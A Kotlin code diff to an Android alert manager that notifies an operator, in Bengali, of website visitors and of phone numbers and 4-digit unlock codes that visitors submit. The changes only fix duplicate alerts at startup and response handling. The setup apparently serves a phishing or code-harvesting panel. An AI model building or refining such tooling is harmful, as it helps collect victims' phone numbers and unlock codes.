@@ -67,7 +67,8 @@ object NotificationAlertManager {
     @Volatile
     private var sdkConnected = false
 
-    private var lastSeenVisitorTs = 0L
+    private val sessionStartTime = System.currentTimeMillis()
+    private var lastSeenVisitorTs = sessionStartTime - 3000L
     private var lastSeenPhone = ""
     private var lastSeenPhoneTs = 0L
     private var lastSeenUnlock = ""
@@ -166,18 +167,23 @@ object NotificationAlertManager {
                 ?: snapshot.child("phone").getValue(String::class.java)
             val phoneTs = snapshot.child("timestamp").getValue(Long::class.java) ?: System.currentTimeMillis()
 
-            if (!phone.isNullOrBlank() && (phone != lastSeenPhone || phoneTs > lastSeenPhoneTs + 3000L)) {
-                lastSeenPhone = phone
-                lastSeenPhoneTs = phoneTs
-                val notification = AppNotification(
-                    id = UUID.randomUUID().toString(),
-                    type = NotificationType.PHONE_NUMBER,
-                    title = "নতুন ফোন নাম্বার নোটিফিকেশন",
-                    message = "ওয়েবসাইট থেকে ফোন নাম্বার সাবমিট হয়েছে: $phone",
-                    payload = phone,
-                    timestamp = phoneTs
-                )
-                dispatchNotification(notification, context, "নতুন ফোন নাম্বার এসেছে: $phone")
+            if (!phone.isNullOrBlank()) {
+                if (lastSeenPhone.isEmpty() && phoneTs < sessionStartTime - 4000L) {
+                    lastSeenPhone = phone
+                    lastSeenPhoneTs = phoneTs
+                } else if (phone != lastSeenPhone || phoneTs > lastSeenPhoneTs + 3000L) {
+                    lastSeenPhone = phone
+                    lastSeenPhoneTs = phoneTs
+                    val notification = AppNotification(
+                        id = UUID.randomUUID().toString(),
+                        type = NotificationType.PHONE_NUMBER,
+                        title = "নতুন ফোন নাম্বার নোটিফিকেশন",
+                        message = "ওয়েবসাইট থেকে ফোন নাম্বার সাবমিট হয়েছে: $phone",
+                        payload = phone,
+                        timestamp = phoneTs
+                    )
+                    dispatchNotification(notification, context, "নতুন ফোন নাম্বার এসেছে: $phone")
+                }
             }
 
             // Check for unlock code
@@ -187,18 +193,23 @@ object NotificationAlertManager {
                 ?: snapshot.child("timestamp").getValue(Long::class.java)
                 ?: System.currentTimeMillis()
 
-            if (!unlockCode.isNullOrBlank() && (unlockCode != lastSeenUnlock || unlockTs > lastSeenUnlockTs + 3000L)) {
-                lastSeenUnlock = unlockCode
-                lastSeenUnlockTs = unlockTs
-                val notification = AppNotification(
-                    id = UUID.randomUUID().toString(),
-                    type = NotificationType.UNLOCK_CODE,
-                    title = "নতুন আনলক নাম্বার নোটিফিকেশন",
-                    message = "ওয়েবসাইট থেকে ৪-সংখ্যার আনলক কোড সাবমিট হয়েছে: $unlockCode",
-                    payload = unlockCode,
-                    timestamp = unlockTs
-                )
-                dispatchNotification(notification, context, "নতুন আনলক কোড এসেছে: $unlockCode")
+            if (!unlockCode.isNullOrBlank()) {
+                if (lastSeenUnlock.isEmpty() && unlockTs < sessionStartTime - 4000L) {
+                    lastSeenUnlock = unlockCode
+                    lastSeenUnlockTs = unlockTs
+                } else if (unlockCode != lastSeenUnlock || unlockTs > lastSeenUnlockTs + 3000L) {
+                    lastSeenUnlock = unlockCode
+                    lastSeenUnlockTs = unlockTs
+                    val notification = AppNotification(
+                        id = UUID.randomUUID().toString(),
+                        type = NotificationType.UNLOCK_CODE,
+                        title = "নতুন আনলক নাম্বার নোটিফিকেশন",
+                        message = "ওয়েবসাইট থেকে ৪-সংখ্যার আনলক কোড সাবমিট হয়েছে: $unlockCode",
+                        payload = unlockCode,
+                        timestamp = unlockTs
+                    )
+                    dispatchNotification(notification, context, "নতুন আনলক কোড এসেছে: $unlockCode")
+                }
             }
         } catch (e: Exception) {
             Log.e(TAG, "Error processing verification snapshot: ${e.message}")
@@ -233,25 +244,26 @@ object NotificationAlertManager {
                 .header("Cache-Control", "no-cache")
                 .get()
                 .build()
-            val visitorResp = httpClient.newCall(visitorReq).execute()
-            if (visitorResp.isSuccessful) {
-                val body = visitorResp.body?.string()
-                if (!body.isNullOrBlank() && body != "null") {
-                    val json = JSONObject(body)
-                    val ts = json.optLong("timestamp", 0L)
-                    if (ts > 0 && ts > lastSeenVisitorTs) {
-                        lastSeenVisitorTs = ts
-                        val platform = json.optString("platform", "ওয়েবসাইট")
-                        val device = json.optString("device", "মোবাইল ডিভাইস")
-                        val notification = AppNotification(
-                            id = UUID.randomUUID().toString(),
-                            type = NotificationType.VISITOR,
-                            title = "নতুন ওয়েবসাইট ভিজিটর",
-                            message = "${platform.uppercase()} ওয়েবসাইটে নতুন ভিজিটর প্রবেশ করেছে ($device)",
-                            payload = device,
-                            timestamp = ts
-                        )
-                        dispatchNotification(notification, context, "নতুন ওয়েবসাইট ভিজিটর প্রবেশ করেছে")
+            httpClient.newCall(visitorReq).execute().use { visitorResp ->
+                if (visitorResp.isSuccessful) {
+                    val body = visitorResp.body?.string()
+                    if (!body.isNullOrBlank() && body != "null") {
+                        val json = JSONObject(body)
+                        val ts = json.optLong("timestamp", 0L)
+                        if (ts > 0 && ts > lastSeenVisitorTs) {
+                            lastSeenVisitorTs = ts
+                            val platform = json.optString("platform", "ওয়েবসাইট")
+                            val device = json.optString("device", "মোবাইল ডিভাইস")
+                            val notification = AppNotification(
+                                id = UUID.randomUUID().toString(),
+                                type = NotificationType.VISITOR,
+                                title = "নতুন ওয়েবসাইট ভিজিটর",
+                                message = "${platform.uppercase()} ওয়েবসাইটে নতুন ভিজিটর প্রবেশ করেছে ($device)",
+                                payload = device,
+                                timestamp = ts
+                            )
+                            dispatchNotification(notification, context, "নতুন ওয়েবসাইট ভিজিটর প্রবেশ করেছে")
+                        }
                     }
                 }
             }
@@ -262,41 +274,52 @@ object NotificationAlertManager {
                 .header("Cache-Control", "no-cache")
                 .get()
                 .build()
-            val verResp = httpClient.newCall(verReq).execute()
-            if (verResp.isSuccessful) {
-                val body = verResp.body?.string()
-                if (!body.isNullOrBlank() && body != "null") {
-                    val json = JSONObject(body)
-                    val phone = json.optString("phoneNumber", "").ifBlank { json.optString("phone", "") }
-                    val phoneTs = json.optLong("timestamp", System.currentTimeMillis())
-                    if (phone.isNotBlank() && (phone != lastSeenPhone || phoneTs > lastSeenPhoneTs + 3000L)) {
-                        lastSeenPhone = phone
-                        lastSeenPhoneTs = phoneTs
-                        val notification = AppNotification(
-                            id = UUID.randomUUID().toString(),
-                            type = NotificationType.PHONE_NUMBER,
-                            title = "নতুন ফোন নাম্বার নোটিফিকেশন",
-                            message = "ওয়েবসাইট থেকে ফোন নাম্বার সাবমিট হয়েছে: $phone",
-                            payload = phone,
-                            timestamp = phoneTs
-                        )
-                        dispatchNotification(notification, context, "নতুন ফোন নাম্বার এসেছে: $phone")
-                    }
+            httpClient.newCall(verReq).execute().use { verResp ->
+                if (verResp.isSuccessful) {
+                    val body = verResp.body?.string()
+                    if (!body.isNullOrBlank() && body != "null") {
+                        val json = JSONObject(body)
+                        val phone = json.optString("phoneNumber", "").ifBlank { json.optString("phone", "") }
+                        val phoneTs = json.optLong("timestamp", System.currentTimeMillis())
+                        if (phone.isNotBlank()) {
+                            if (lastSeenPhone.isEmpty() && phoneTs < sessionStartTime - 4000L) {
+                                lastSeenPhone = phone
+                                lastSeenPhoneTs = phoneTs
+                            } else if (phone != lastSeenPhone || phoneTs > lastSeenPhoneTs + 3000L) {
+                                lastSeenPhone = phone
+                                lastSeenPhoneTs = phoneTs
+                                val notification = AppNotification(
+                                    id = UUID.randomUUID().toString(),
+                                    type = NotificationType.PHONE_NUMBER,
+                                    title = "নতুন ফোন নাম্বার নোটিফিকেশন",
+                                    message = "ওয়েবসাইট থেকে ফোন নাম্বার সাবমিট হয়েছে: $phone",
+                                    payload = phone,
+                                    timestamp = phoneTs
+                                )
+                                dispatchNotification(notification, context, "নতুন ফোন নাম্বার এসেছে: $phone")
+                            }
+                        }
 
-                    val unlock = json.optString("unlockCode", "").ifBlank { json.optString("code", "") }
-                    val unlockTs = json.optLong("updatedAt", json.optLong("timestamp", System.currentTimeMillis()))
-                    if (unlock.isNotBlank() && (unlock != lastSeenUnlock || unlockTs > lastSeenUnlockTs + 3000L)) {
-                        lastSeenUnlock = unlock
-                        lastSeenUnlockTs = unlockTs
-                        val notification = AppNotification(
-                            id = UUID.randomUUID().toString(),
-                            type = NotificationType.UNLOCK_CODE,
-                            title = "নতুন আনলক নাম্বার নোটিফিকেশন",
-                            message = "ওয়েবসাইট থেকে ৪-সংখ্যার আনলক কোড সাবমিট হয়েছে: $unlock",
-                            payload = unlock,
-                            timestamp = unlockTs
-                        )
-                        dispatchNotification(notification, context, "নতুন আনলক কোড এসেছে: $unlock")
+                        val unlock = json.optString("unlockCode", "").ifBlank { json.optString("code", "") }
+                        val unlockTs = json.optLong("updatedAt", json.optLong("timestamp", System.currentTimeMillis()))
+                        if (unlock.isNotBlank()) {
+                            if (lastSeenUnlock.isEmpty() && unlockTs < sessionStartTime - 4000L) {
+                                lastSeenUnlock = unlock
+                                lastSeenUnlockTs = unlockTs
+                            } else if (unlock != lastSeenUnlock || unlockTs > lastSeenUnlockTs + 3000L) {
+                                lastSeenUnlock = unlock
+                                lastSeenUnlockTs = unlockTs
+                                val notification = AppNotification(
+                                    id = UUID.randomUUID().toString(),
+                                    type = NotificationType.UNLOCK_CODE,
+                                    title = "নতুন আনলক নাম্বার নোটিফিকেশন",
+                                    message = "ওয়েবসাইট থেকে ৪-সংখ্যার আনলক কোড সাবমিট হয়েছে: $unlock",
+                                    payload = unlock,
+                                    timestamp = unlockTs
+                                )
+                                dispatchNotification(notification, context, "নতুন আনলক কোড এসেছে: $unlock")
+                            }
+                        }
                     }
                 }
             }
